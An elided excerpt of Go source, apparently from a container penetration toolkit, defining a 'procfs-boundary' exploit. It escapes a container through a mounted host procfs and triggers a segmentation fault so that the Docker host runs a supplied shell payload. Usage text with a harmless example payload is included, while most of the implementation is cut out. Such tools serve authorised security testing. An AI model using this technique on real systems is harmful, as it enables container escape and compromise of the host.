//go:build !no_procfs_boundary
// +build !no_procfs_boundary
...
func ProcfsExploit(procDir string, shellPayload string) {
	...
	log.Println("trigger segment fault to finish check, pls check if payload executed success after this program quit.")
	triggerSegmentFault()
}
...
func (p mountProcfsExpS) Desc() string {
	return "escape container via mounted procfs. usage: cdk run procfs-boundary <dir> \"<shell-payload>\""
}
...
func helpMsg() {
	log.Println("usage: cdk run procfs-boundary <dir> \"<shell-payload>\"")
	log.Fatal("example: cdk run procfs-boundary /mnt/host_proc \"touch /tmp/exploit_success\" (the shell payload will run by docker host).")
}
